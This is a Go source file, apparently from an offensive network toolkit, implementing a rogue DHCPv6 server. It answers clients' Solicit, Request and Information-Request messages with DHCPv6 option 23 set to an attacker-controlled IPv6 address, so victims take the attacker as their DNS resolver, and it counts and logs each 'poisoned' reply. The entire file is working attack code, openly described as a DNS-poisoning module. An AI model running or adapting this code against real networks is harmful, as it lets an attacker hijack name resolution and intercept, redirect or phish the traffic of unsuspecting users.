// Package dhcp6 implements a rogue DHCPv6 server that hands victims a DNS
// server controlled by the attacker (option 23), enabling DNS poisoning for
// clients that prefer DHCPv6-provided DNS over RDNSS.
package dhcp6

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/qyvora/toha3ee/internal/events"
)

// DHCPv6 message types. These are the one-byte message-type field values at
// the start of every DHCPv6 packet (RFC 8415 §7.3).
const (
	msgSolicit   = 1  // client -> servers, asks for configuration
	msgAdvertise = 2  // server -> client, offers configuration (never sent to all servers)
	msgRequest   = 3  // client -> servers, picks a specific server's offer
	msgReply     = 7  // server -> client, final configuration
	msgInfoReq   = 11 // client -> servers, configuration without addresses
)

// Option codes. Each option is a two-byte code plus a two-byte length field
// plus data (RFC 8415 §21).
const (
	optClientID   = 1
	optServerID   = 2
	optIANA       = 3
	optORO        = 6
	optDNS        = 23 // DNS recursive name server, our poison vector
	optDomainList = 24
)

// Responder answers DHCPv6 Solicit/Request/Information-Request with a server
// that advertises attackerIP as the recursive DNS server.
type Responder struct {
	iface      *net.Interface
	attackerIP net.IP // IPv6 address advertised as the DNS server (option 23)
	bus        *events.Bus

	conn     *net.UDPConn
	stop     chan struct{} // closed by Stop to unblock the read loop
	wg       sync.WaitGroup
	stopOnce sync.Once

	Queries  atomic.Int64 // DHCPv6 messages parsed
	Poisoned atomic.Int64 // responses carrying the rogue DNS server sent
}

// New returns an idle responder. attackerIP must be a valid IPv6 address.
func New(iface *net.Interface, attackerIP net.IP, bus *events.Bus) *Responder {
	// Normalize to a 16-byte form once so option encoding always writes 16
	// bytes regardless of how the caller constructed the IP.
	return &Responder{iface: iface, attackerIP: attackerIP.To16(), bus: bus, stop: make(chan struct{})}
}

// Start binds UDP6 :547 and joins the DHCPv6 all-servers multicast group.
func (r *Responder) Start() error {
	if r.attackerIP == nil {
		return fmt.Errorf("dhcp6: no attacker IPv6 configured")
	}
	// DHCPv6 servers listen on port 547; binding the unspecified address
	// accepts unicast as well as multicast traffic on every interface.
	conn, err := net.ListenUDP("udp6", &net.UDPAddr{IP: net.IPv6unspecified, Port: 547})
	if err != nil {
		return fmt.Errorf("dhcp6 bind [::]:547: %w", err)
	}
	// ff02::1:2 is the DHCPv6 all-servers link-local multicast group that
	// clients send Solicit/Request/Information-Request to.
	group := net.ParseIP("ff02::1:2")
	if err := joinGroup(conn, r.iface, group); err != nil {
		_ = conn.Close()
		return fmt.Errorf("dhcp6 join multicast: %w", err)
	}
	r.conn = conn
	r.wg.Add(1)
	go r.loop()
	return nil
}

// Stop closes the socket and waits for the read loop to exit.
func (r *Responder) Stop() {
	// Closing the socket is what actually unblocks ReadFromUDP, so the stop
	// channel and the conn close must happen together, exactly once.
	r.stopOnce.Do(func() {
		close(r.stop)
		if r.conn != nil {
			_ = r.conn.Close()
		}
	})
	r.wg.Wait()
}

// loop reads datagrams until stopped and answers each poisonable one.
func (r *Responder) loop() {
	defer r.wg.Done()
	buf := make([]byte, 4096)
	for {
		select {
		case <-r.stop:
			return
		default:
		}
		// A short read deadline makes the loop poll the stop channel even when
		// no traffic arrives; without it Close() alone would suffice but the
		// extra poll keeps shutdown immediate.
		_ = r.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, src, err := r.conn.ReadFromUDP(buf)
		if err != nil {
			continue // deadline hit or socket closed; re-check stop
		}
		if reply := r.handle(buf[:n]); reply != nil {
			// Clients always listen on UDP 546, whether they sent from it or
			// not, so the reply goes straight back to the source address.
			dst := &net.UDPAddr{IP: src.IP, Port: 546}
			if _, err := r.conn.WriteToUDP(reply, dst); err == nil {
				r.Poisoned.Add(1)
			}
		}
	}
}

// handle parses a DHCPv6 client message and builds the matching response.
func (r *Responder) handle(pkt []byte) []byte {
	// Minimum DHCPv6 message: 1 byte type + 3 byte transaction ID, no options.
	if len(pkt) < 4 {
		return nil
	}
	msgType := pkt[0]
	txid := pkt[1:4]
	options := parseOptions(pkt[4:])

	r.Queries.Add(1)
	var clientID, serverID []byte
	var iaids [][]byte
	for _, o := range options {
		switch o.code {
		case optClientID:
			// Echoed back so the client can match the response to its identity.
			clientID = o.data
		case optServerID:
			// The client echoes our ServerID in Request; reuse it so the
			// response looks like a continuation of the same exchange.
			serverID = o.data
		case optIANA:
			// Keep the client's IAID so it can associate the IA_NA we return.
			if len(o.data) >= 4 {
				iaids = append(iaids, o.data[:4])
			}
		}
	}

	var respType byte
	switch msgType {
	case msgSolicit:
		// Solicit is answered with an Advertise (stateful, options only).
		respType = msgAdvertise
	case msgRequest, msgInfoReq:
		// Request and Information-Request are both finalized with a Reply.
		respType = msgReply
	default:
		return nil // not an exchange we can poison
	}
	_ = serverID

	msg := append([]byte{respType}, txid...)
	msg = appendOption(msg, optServerID, serverID)
	if clientID != nil {
		msg = appendOption(msg, optClientID, clientID)
	}
	// DNS recursive name servers (option 23) -> attacker. This is the entire
	// point of the module: victims adopt the attacker as their resolver.
	msg = appendOption(msg, optDNS, r.attackerIP)
	for _, iaid := range iaids {
		// Echo the IA_NA (option 3) with the client's IAID, no lease.
		iana := append([]byte{}, iaid...)
		iana = append(iana, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) // T1=0, T2=0
		msg = appendOption(msg, optIANA, iana)
	}

	if r.bus != nil {
		r.bus.Emit(events.TopicLog,
			fmt.Sprintf("dhcp6.spoof: %s %s -> DNS %s", srcName(msgType), fmt.Sprint(iaids), r.attackerIP))
	}
	return msg
}

// srcName maps a DHCPv6 message type byte to a log-friendly name.
func srcName(t byte) string {
	switch t {
	case msgSolicit:
		return "solicit"
	case msgRequest:
		return "request"
	case msgInfoReq:
		return "info-req"
	}
	return "query"
}

// option is one decoded DHCPv6 option (code + raw data).
type option struct {
	code uint16
	data []byte
}

// parseOptions walks a DHCPv6 options blob. Every option starts with a 2-byte
// code and 2-byte big-endian length, followed by that many data bytes.
func parseOptions(b []byte) []option {
	var out []option
	for len(b) >= 4 {
		code := binary.BigEndian.Uint16(b[:2])
		length := int(binary.BigEndian.Uint16(b[2:4]))
		if length > len(b)-4 {
			return out // truncated option; stop rather than read past the end
		}
		out = append(out, option{code: code, data: b[4 : 4+length]})
		b = b[4+length:]
	}
	return out
}

// appendOption serializes one DHCPv6 option (2-byte code, 2-byte length, data)
// onto msg.
func appendOption(msg []byte, code uint16, data []byte) []byte {
	var hdr [4]byte
	binary.BigEndian.PutUint16(hdr[:2], code)
	binary.BigEndian.PutUint16(hdr[2:], uint16(len(data)))
	msg = append(msg, hdr[:]...)
	return append(msg, data...)
}
